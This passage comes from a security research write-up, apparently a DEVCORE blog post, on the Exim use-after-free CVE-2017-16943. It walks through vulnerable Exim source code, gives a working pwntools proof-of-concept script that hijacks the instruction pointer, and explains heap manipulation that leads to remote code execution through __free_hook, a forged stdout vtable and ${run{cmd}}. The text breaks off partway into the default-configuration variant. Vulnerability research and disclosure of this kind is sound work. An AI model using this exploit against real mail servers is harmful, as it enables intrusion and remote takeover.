&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(;;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;receive_getc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GETC_BUFFER_UNLIMITED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  
  &lt;span class=&quot;cm&quot;&gt;/* If we hit EOF on a SMTP connection, it&#39;s an error, since incoming
  SMTP must have a correct &quot;.&quot; terminator. */&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EOF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smtp_input&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* &amp;amp;&amp;amp; !smtp_batched_input */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;smtp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle_lost_connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; (header)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;smtp_yield&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TIDYUP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;cm&quot;&gt;/* Skip to end of function */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;, once the SIZE is reached, it tries to read the next BDAT command and raises error message if the following command is incorrect. &lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L628&quot;&gt;smtp_in.c: 628 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BDAT_CMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sscanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smtp_cmd_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%u %n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunking_datasize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L_smtp_protocol_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;missing size for BDAT command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In exim, it usually calls &lt;code class=&quot;highlighter-rouge&quot;&gt;synprot_error&lt;/code&gt; to raise error message, which also logs at the same time.&lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L2984&quot;&gt;smtp_in.c: 628 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errmess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;log_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOG_MAIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SMTP %s error in &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; %s %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L_smtp_syntax_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;syntax&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;protocol&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;string_printing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_cmd_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_and_ident&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errmess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The log messages are printed by string_printing. This function ensures a string is printable. For this reason, it extends the string to transfer characters if any unprintable character exists, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;&#39;\n&#39;-&amp;gt;&#39;\\n&#39;&lt;/code&gt;. Therefore, it asks &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; for memory to store strings.&lt;br /&gt;
This store makes &lt;code class=&quot;highlighter-rouge&quot;&gt;if (!store_extend(next-&amp;gt;text, oldsize, header_size))&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt; failed when next extension occurs and then triggers use-after-free.&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;The following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when &lt;strong&gt;dkim&lt;/strong&gt; is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;127.0.0.1&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EHLO test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;250 HELP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1250&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;command&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;BDAT 1&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;:BDAT &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;command&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;Running out of &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt;&lt;br /&gt;
 In order to achieve code execution, we need to make the &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; get the first store of a block. That is, running out of &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; and making &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; allocate a new block. Therefore, we send a long message &lt;code class=&quot;highlighter-rouge&quot;&gt;&#39;a&#39;*0x1250+&#39;\x7f&#39;&lt;/code&gt; with an unprintable character to cut &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt;, making &lt;code class=&quot;highlighter-rouge&quot;&gt;yield_length&lt;/code&gt; less than 0x100.&lt;br /&gt;
 &lt;img src=&quot;/assets/img/blog/20171211/2.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Starts BDAT data transfer&lt;br /&gt;
 After that, we send BDAT command to start data transfer. At the beginning, &lt;code class=&quot;highlighter-rouge&quot;&gt;next&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; are allocated by &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt;. &lt;br /&gt;
 &lt;img src=&quot;/assets/img/blog/20171211/3.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
 The function &lt;code class=&quot;highlighter-rouge&quot;&gt;dkim_exim_verify_init&lt;/code&gt; is called sequentially and it also calls &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt;. Notice that this function uses &lt;strong&gt;ANOTHER &lt;code class=&quot;highlighter-rouge&quot;&gt;store_pool&lt;/code&gt;&lt;/strong&gt;, so it allocates from heap without changing &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; which &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; also points to.&lt;br /&gt;
 &lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1734&quot;&gt;receive.c: 1734 receive_msg&lt;/a&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_batched_input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dkim_disable_verify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;dkim_exim_verify_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunking_state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CHUNKING_OFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Call &lt;code class=&quot;highlighter-rouge&quot;&gt;store_getc&lt;/code&gt; inside &lt;code class=&quot;highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;&lt;br /&gt;
 Then, we send a BDAT command without SIZE. Exim complains about the incorrect command and cuts the &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;string_printing&lt;/code&gt;. &lt;br /&gt;
 &lt;img src=&quot;/assets/img/blog/20171211/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Keep sending msg until extension and bug triggered&lt;br /&gt;
 In this way, while we keep sending huge messages, &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; gets freed after the extension. In the malloc.c of glibc (so called ptmalloc2), system manages a linked list of freed memory chunks, which is called unsorted bin. Freed chunks are put into unsorted bin if it is not the last chunk on the heap. In step 2, &lt;code class=&quot;highlighter-rouge&quot;&gt;dkim_exim_verify_init&lt;/code&gt; allocated chunks after &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;. Therefore, this chunk is put into unsorted bin and the pointers of linked list are stored into the first 16 bytes of chunk (on x86-64). The location written is exactly &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block-&amp;gt;next&lt;/code&gt;, and therefore &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block-&amp;gt;next&lt;/code&gt; is overwritten to &lt;code class=&quot;highlighter-rouge&quot;&gt;unsorted bin&lt;/code&gt; inside &lt;code class=&quot;highlighter-rouge&quot;&gt;main_arena&lt;/code&gt; of libc (linked list pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; points back to &lt;code class=&quot;highlighter-rouge&quot;&gt;unsorted bin&lt;/code&gt; if no other freed chunk exists). &lt;br /&gt;
 &lt;img src=&quot;/assets/img/blog/20171211/5.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Keep sending msg for the next extension&lt;br /&gt;
 When the next extension occurs, &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; tries to cut from &lt;code class=&quot;highlighter-rouge&quot;&gt;main_arena&lt;/code&gt;, which makes attackers able to overwrite all global variables below main_arena.&lt;/li&gt;
  &lt;li&gt;Overwrite global variables in libc&lt;/li&gt;
  &lt;li&gt;Finish sending message and trigger &lt;code class=&quot;highlighter-rouge&quot;&gt;free()&lt;/code&gt;&lt;br /&gt;
 In the PoC, we simply modified &lt;code class=&quot;highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; and ended the line. Exim calls &lt;code class=&quot;highlighter-rouge&quot;&gt;store_reset&lt;/code&gt; to reset the buffer and calls &lt;code class=&quot;highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;free()&lt;/code&gt;. At this stage, we successfully controlled instruction pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;$rip&lt;/code&gt;.&lt;br /&gt;
 However, this is not enough for an RCE because the arguments are uncontrollable. As a result, we improved this PoC to modify both &lt;code class=&quot;highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;_IO_2_1_stdout_&lt;/code&gt;. We forged the vtable of &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt; and set &lt;code class=&quot;highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; to any call of &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush(stdout)&lt;/code&gt; inside exim. When the program calls fflush, it sets the first argument to stdout and jumps to a function pointer on the vtable of stdout. Hence, we can control both &lt;code class=&quot;highlighter-rouge&quot;&gt;$rip&lt;/code&gt; and the content of first argument. &lt;br /&gt;
 We consulted past CVE exploits and decided to call &lt;code class=&quot;highlighter-rouge&quot;&gt;expand_string&lt;/code&gt;, which executes command with &lt;code class=&quot;highlighter-rouge&quot;&gt;execv&lt;/code&gt; if we set the first argument to &lt;code class=&quot;highlighter-rouge&quot;&gt;${run{cmd}}&lt;/code&gt;, and finally we got our RCE. &lt;br /&gt;
 &lt;img src=&quot;/assets/img/blog/20171211/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;exploit-for-default-configured-exim&quot;&gt;Exploit for default configured exim&lt;/h4&gt;
&lt;p&gt;When dkim is disabled, the PoC above fails because &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; is the last chunk on heap. This makes the system merge it into a big chunk called &lt;strong&gt;top chunk&lt;/strong&gt; rather than unsorted bin.&lt;br /&gt;
The illustrations below describe the difference of heap layout:&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/8.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To avoid this, we need to make exim allocate and free some memories before we actually start our exploitation. Therefore, we add some steps between step 1 and step 2.&lt;/p&gt;

&lt;p&gt;After running out of &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt;:&lt;/p&gt;
&lt;ol&gt;
